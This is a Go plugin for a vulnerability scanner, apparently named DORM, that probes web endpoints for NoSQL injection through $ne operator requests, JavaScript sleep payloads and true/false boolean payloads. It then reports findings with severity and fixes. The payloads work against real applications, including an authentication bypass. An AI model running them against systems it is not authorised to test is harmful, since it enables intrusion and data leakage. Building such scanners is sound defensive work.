package plugins

import (
	"DORM/models"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"time"
)

type NoSQLPlugin struct{}

func (p *NoSQLPlugin) Name() string { return "NoSQL Injection (Boolean & Time-Based)" }

func (p *NoSQLPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	endpoints := []string{"/login", "/api/users", "/search", "/products", "/api/find", "/"}
	params := []string{"user", "username", "u", "search", "q", "id", "token", "code", "password"}

	for _, ep := range endpoints {
		for _, param := range params {
			targetURL := baseURL + ep

			reqBase, _ := http.NewRequest("GET", targetURL, nil)
			qBase := reqBase.URL.Query()
			qBase.Add(param, "dorm_random_value_9999")
			reqBase.URL.RawQuery = qBase.Encode()

			respBase, err := client.Do(reqBase)
			if err != nil {
				continue
			}

			bodyBase, _ := io.ReadAll(respBase.Body)
			respBase.Body.Close()
			lenBase := len(bodyBase)
			codeBase := respBase.StatusCode

			attackQuery := fmt.Sprintf("%s[$ne]=dorm_random_value_9999", param)
			fullAttackURL := fmt.Sprintf("%s?%s", targetURL, attackQuery)

			reqAttack, _ := http.NewRequest("GET", fullAttackURL, nil)
			respAttack, err := client.Do(reqAttack)

			if err == nil {
				bodyAttack, _ := io.ReadAll(respAttack.Body)
				respAttack.Body.Close()
				lenAttack := len(bodyAttack)
				codeAttack := respAttack.StatusCode

				if codeBase != 200 && codeAttack == 200 {
					return &models.Vulnerability{
						Target:      target,
						Name:        "NoSQL Injection (Operator: $ne)",
						Severity:    "HIGH",
						CVSS:        8.2,
						Description: fmt.Sprintf("Authentication bypassed using MongoDB '$ne' (Not Equal) operator.\nParam: %s\nBaseline Code: %d\nAttack Code: %d", param, codeBase, codeAttack),
						Solution:    "Sanitize inputs and disable operator injection in query parsers.",
						Reference:   "OWASP NoSQL Injection",
					}
				}

				if lenAttack > (lenBase + 200) {
					return &models.Vulnerability{
						Target:      target,
						Name:        "NoSQL Injection (Data Leak)",
						Severity:    "HIGH",
						CVSS:        7.5,
						Description: fmt.Sprintf("Response size significantly increased when using '$ne' operator, indicating data leakage.\nParam: %s", param),
						Solution:    "Validate user input types strictly (string vs object).",
						Reference:   "CWE-943: Improper Neutralization of Special Elements in Data Query Logic",
					}
				}
			}

			timePayloads := []string{

				`';sleep(5000);var a='`,
				`"';sleep(5000);var a='"`,

				`0;sleep(5000)`,

				`1';sleep(5000);||'1'=='1`,
			}

			for _, tp := range timePayloads {

				qs := url.Values{}
				qs.Set(param, tp)
				timeAttackURL := fmt.Sprintf("%s?%s", targetURL, qs.Encode())

				start := time.Now()
				respTime, err := client.Get(timeAttackURL)
				elapsed := time.Since(start)

				if err == nil {
					respTime.Body.Close()
				}

				if elapsed > 4500*time.Millisecond {
					return &models.Vulnerability{
						Target:      target,
						Name:        "Blind NoSQL Injection (Time-Based)",
						Severity:    "CRITICAL",
						CVSS:        9.8,
						Description: fmt.Sprintf("The server slept for ~5 seconds when executing a JavaScript payload.\nThis confirms arbitrary JavaScript execution within the database.\nParam: %s\nPayload: %s", param, tp),
						Solution:    "Disable server-side JavaScript execution (e.g., --noscript in MongoDB) and validate input.",
						Reference:   "CWE-943 / OWASP Injection",
					}
				}
			}

			truePayload := `' && 1==1 && 'a'=='a`
			falsePayload := `' && 1==0 && 'a'=='a`

			qsTrue := url.Values{}
			qsTrue.Set(param, truePayload)
			qsFalse := url.Values{}
			qsFalse.Set(param, falsePayload)

			respTrue, errT := client.Get(targetURL + "?" + qsTrue.Encode())
			respFalse, errF := client.Get(targetURL + "?" + qsFalse.Encode())

			if errT == nil && errF == nil {
				defer respTrue.Body.Close()
				defer respFalse.Body.Close()

				if respTrue.StatusCode == 200 && respFalse.StatusCode != 200 {
					return &models.Vulnerability{
						Target:      target,
						Name:        "Blind NoSQL Injection (Boolean)",
						Severity:    "HIGH",
						CVSS:        8.0,
						Description: fmt.Sprintf("Server responded differently to True/False logic injection.\nTrue Payload: 200 OK\nFalse Payload: %d %s", respFalse.StatusCode, http.StatusText(respFalse.StatusCode)),
						Solution:    "Use parameterized queries and avoid string concatenation in NoSQL queries.",
						Reference:   "OWASP NoSQL Injection",
					}
				}
			}
		}
	}

	return nil
}
